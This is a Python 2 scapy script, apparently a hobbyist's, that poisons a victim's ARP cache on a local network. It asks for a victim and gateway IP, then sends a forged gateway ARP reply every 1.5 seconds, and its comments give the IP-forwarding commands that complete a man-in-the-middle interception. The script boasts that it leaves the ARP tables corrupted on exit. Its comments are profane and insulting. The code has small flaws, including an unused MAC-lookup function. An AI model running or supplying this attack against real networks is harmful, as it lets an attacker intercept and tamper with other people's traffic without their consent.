#! /usr/bin/python2

# I guess scapy requires tcpdump to rid 
#  fucking runtime log warnings... :/
#  pacman -S tcpdump

# ip forrwarding until reboot
#  sysctl net.ipv4.ip_forward=1
#  echo 1 > /proc/sys/net/ipv4/ip_forward

# stop warnings for things I don't need
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import *
import time, sys, os, re

# get mac from an ip on lan via icmp
#  you can use ARP to get it, but that
#  can be your homework assignment
def getRemoteMac(target):
	ping = IP(dst=target)/ICMP()
	ping_reply = sr1(ping,verbose=0,timeout=2)
	if not ping_reply:
		print "No reply, invalid target. Suicide?"
		sys.exit()
	else:
		cmd_response = os.popen("arp -n '%s'" % target).read()
		mac = re.search(r"\w+:\w+:\w+:\w+:\w+:\w+", cmd_response)
		mac = mac.group() #should only be one motherfucker
	return mac

# Linux only, Windows users have another homework assignment here
def getOwnMac(interface):
	fd = open("/sys/class/net/%s/address" % interface , "r")
	mac = fd.read()
	fd.close()
	return mac.strip()
	
# Could expand to see which interface is UP or DOWN
#  also could use to get local mac address as well
#  more homework you lazy cunt, lol
def getInterfaces():
	raw = os.popen("ip link show").read()
	interface = re.findall(r"\d: \w+:", raw)
	for i in interface:
		print i[:-1]

op = 2 #op code for ARP reply, 1 is request

# Get required info. Could just use argvs
#  but I like the interactivity
getInterfaces()
interface = str(raw_input("Interface: "))
victim_ip = str(raw_input("Victim IP: "))
gateway_ip = str(raw_input("Gateway IP: "))
own_mac = getOwnMac(interface)

# genorate target arp packet
arp = ARP(op=op,
          psrc=gateway_ip,
          pdst=victim_ip,
          hwdst=own_mac)

# Start cache poisen. I don't have any 
#  graceful closures because I'm an asshole.
#  A gentalmen would catch a ctrl+c and
#  revert the ARP tables. Meh.
print "running..."
while True:
	send(arp, verbose=0)
	time.sleep(1.5)
